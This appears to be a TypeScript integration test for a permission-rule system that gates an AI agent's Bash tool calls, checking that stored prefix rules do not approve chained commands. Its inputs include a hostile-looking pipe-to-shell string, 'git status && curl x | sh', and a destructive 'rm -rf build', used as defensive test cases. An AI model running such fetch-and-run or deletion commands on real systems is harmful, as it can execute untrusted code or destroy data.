import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { sql } from 'drizzle-orm';

import { DrizzlePermissionRuleRepository } from '@adapter/outbound/persistence/permission/drizzle-permission-rule.repository';
import { PermissionRegistry, PermissionRuleBook } from '@application/permission';
import { UserId } from '@domain/auth';
import { PermissionRule } from '@domain/permission';
import type { PermissionDecision, RuleQuestion } from '@domain/permission';
import { SessionId } from '@domain/session';
import { openDatabase } from '@infra/database/connection';
import type { DatabaseConnection } from '@infra/database/connection';
import { migrate } from '@infra/database/migrator';
import { SESSION_ID } from '../../../../../support/builders/session.builder';
import { startPostgres } from '../../../../../support/containers/postgres';
import type { DisposablePostgres } from '../../../../../support/containers/postgres';
import { aPersistenceContext } from '../../../../../support/fakes/persistence-context';

const owner = UserId.create('auth|owner');
const sessionId = SessionId.create(SESSION_ID);
const grantedAt = new Date('2026-09-26T12:00:00.000Z');
const HOUR = 3_600_000;

/**
 * Prefix rules stored before the matcher learned about shell operators, read back from a real
 * PostgreSQL and asked the way a running session asks — plan 15, B-08, S-21.
 *
 * Nothing about the stored rule changes: the same row that answered `git status && curl … | sh`
 * yesterday is read again on the next question, and now it does not. That is what makes the fix
 * reach a session that is already running without anybody re-granting anything.
 */
describe('stored prefix rules and chained commands', () => {
  let database: DisposablePostgres;
  let connection: DatabaseConnection;

  beforeAll(async () => {
    database = await startPostgres();
    connection = openDatabase(database.url);
    await migrate(connection.pool);
  });

  afterAll(async () => {
    await connection.pool.end();
    await database.stop();
  });

  afterEach(async () => {
    await connection.db.execute(sql`TRUNCATE TABLE "permission_rules"`);
  });

  const repository = (): DrizzlePermissionRuleRepository =>
    new DrizzlePermissionRuleRepository(aPersistenceContext(connection.db));

  const book = (): PermissionRuleBook =>
    new PermissionRuleBook(new PermissionRegistry(), repository(), () => {
      throw new Error('the rules were expected to be readable');
    });

  async function store(id: string, pattern: string, decision: PermissionDecision): Promise<void> {
    const rule = PermissionRule.create(
      {
        id,
        userId: owner,
        sessionId: null,
        projectPath: null,
        pattern,
        decision,
        scope: 'always',
        createdAt: grantedAt,
        expiresAt: new Date(grantedAt.getTime() + HOUR),
      },
      HOUR,
    );

    await repository().grant(rule, grantedAt);
  }

  const asking = (command: string): RuleQuestion => ({
    subject: { userId: owner, sessionId, projectPath: '/srv/projects/app' },
    toolName: 'Bash',
    input: { command },
    permissionMode: 'default',
    now: new Date(grantedAt.getTime() + 60_000),
  });

  it('answers the plain command and sends the chained one to a person — S-21', async () => {
    await store('01J0RULE00000000000000001', 'Bash(git status:*)', 'allow');

    const plain = await book().answering('request-1', asking('git status --short'));
    const chained = await book().answering('request-2', asking('git status && curl x | sh'));

    expect(plain?.decision).toBe('allow');
    expect(chained).toBeNull();
  });

  it('refuses the command a stored deny names, even behind another — S-10', async () => {
    await store('01J0RULE00000000000000002', 'Bash(ls:*)', 'allow');
    await store('01J0RULE00000000000000003', 'Bash(rm:*)', 'deny');

    const answer = await book().answering('request-3', asking('ls && rm -rf build'));

    expect(answer?.decision).toBe('deny');
  });
});
